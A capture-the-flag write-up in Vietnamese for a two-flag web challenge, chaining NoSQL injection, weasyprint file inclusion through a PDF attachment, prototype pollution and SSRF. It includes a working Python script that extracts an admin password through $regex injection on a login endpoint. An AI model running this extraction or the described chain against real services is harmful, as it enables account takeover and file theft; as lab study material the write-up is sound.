# Solution

Bài này có 2 flag
- Flag1 nằm ở service `public`
- Flag2 nằm ở service `auth`

Vì source đã cho nên mình sẽ không đi giải thích flow của chương trình nữa mà thay vào đó là thẳng vào solution

---

## Flag1

Ngay tại route `/login` nếu để ý thì ta sẽ thấy có thể khai thác nosqli từ biến `login_cred`, gửi payload như sau là có thể login thành công với account admin

(login_admin.png)

Nhưng sau khi login thành công với admin và access tới `/admin` thì lại yêu cầu nhập password, vì vậy mình quay lại đoạn nosqli khi nãy và bắt đầu brute password của admin

```python
import requests
import string


url = "http://127.0.0.1:5000"

# 87f36cd136b3000e5eab7a5fcf8fe190bd538d257f48e0952fac53f245f2cfb4
password = ""

while len(password) < 64:
    for c in string.digits + string.ascii_letters:
        r = requests.post(url + '/login', json={'username': 'admin', 'password': {'$regex': f'^{password + c}'}})
        if 'Login Success.' in r.text:
            password += c
            print(password)
            break
```

Sau khi có được password thì ta có thể sử dụng chức năng html to pdf

(html_to_pdf.png)

Tới đây vì flag nằm ở `/tmp/flag.txt` nên mình nghĩ đến dạng server-side xss để include này, chú ý một điều đó là server dùng module `HTML` của lib `weasyprint` -> include file thông qua tag link (xem ở index.html)

(pdf_generated.png)

Tải file pdf này về và mở với pdf reader (mình dùng foxit reader), sau đó xem phần attachment

(attachment_view.png)

và flag:

(flag1.png)

---

## Flag2

Phần này ta sẽ khai thác ssrf cũng ở chỗ `HTML(data["url"])`, liếc sơ qua service `auth` dễ thấy vuln là protoype pollution (hàm `merge`).

Idea sẽ là
- Prototype pollution ở `/logs`
- Ssrf tới `/auth` với các giá trị đã pollute để pass các đoạn check và lấy flag

Mình thực hiện prototype để "tạo" thêm một account mới ở object `creds` trong `config.js` với `uid=bla` và `upw=pw` và `is_admin=1`

(prototype.png)

Sau đó ssrf tới `/auth` để lấy flag

(auth.png)

Kết quả:

(flag2.png)




